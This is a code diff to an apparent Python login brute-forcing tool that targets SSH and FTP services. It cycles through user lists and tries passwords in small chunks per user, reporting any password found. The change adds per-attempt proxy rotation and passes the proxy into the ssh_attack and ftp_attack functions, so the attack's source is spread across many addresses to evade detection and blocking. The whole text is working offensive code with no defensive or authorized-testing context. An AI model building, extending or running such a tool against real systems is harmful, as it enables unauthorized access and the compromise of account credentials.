@@ -149,17 +149,20 @@ if __name__ == '__main__':
 
         password_chunk_size = 3
         first_iteration = True
+        proxy_idx = 0  # Index to keep track of which proxy to use
+
         for i in range(0, len(passwords), password_chunk_size):
             for idx, user in enumerate(users):
-                proxy_ip, proxy_port = proxies[i % len(proxies)] if proxies else (None, None)
+                # Set proxy for this user
+                proxy_ip, proxy_port = proxies[proxy_idx] if proxies else (None, None)
+                proxy_idx = (proxy_idx + 1) % len(proxies) if proxies else 0  # Rotate back to start if end is reached
 
                 if proxy_ip:
                     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using proxy {proxy_ip}:{proxy_port}")
 
-                if idx == 0:
-                    if not first_iteration:
-                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Returning to first user...")
-                else:
+                if idx == 0 and not first_iteration:
+                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Returning to first user...")
+                elif idx != 0:
                     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Switching to next user....")
 
                 for j in range(password_chunk_size):
@@ -169,12 +172,12 @@ if __name__ == '__main__':
                     print(current_timestamp(), f"Trying user [*]{Fore.YELLOW}{user}{Fore.RESET}[*] with password: {Fore.YELLOW}{password}")
 
                     if args.service == 'ssh':
-                        if handle_timeout(ssh_attack, args.ip, user, password):
+                        if handle_timeout(ssh_attack, args.ip, user, password, proxy_ip, proxy_port):
                             print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Password found for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
                             users.remove(user)
                             break
                     elif args.service == 'ftp':
-                        if handle_timeout(ftp_attack, args.ip, user, password):
+                        if handle_timeout(ftp_attack, args.ip, user, password, proxy_ip, proxy_port):
                             print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Password found for [*]{user}{Fore.RESET}[*]: {Fore.GREEN}{password}")
                             users.remove(user)
                             break
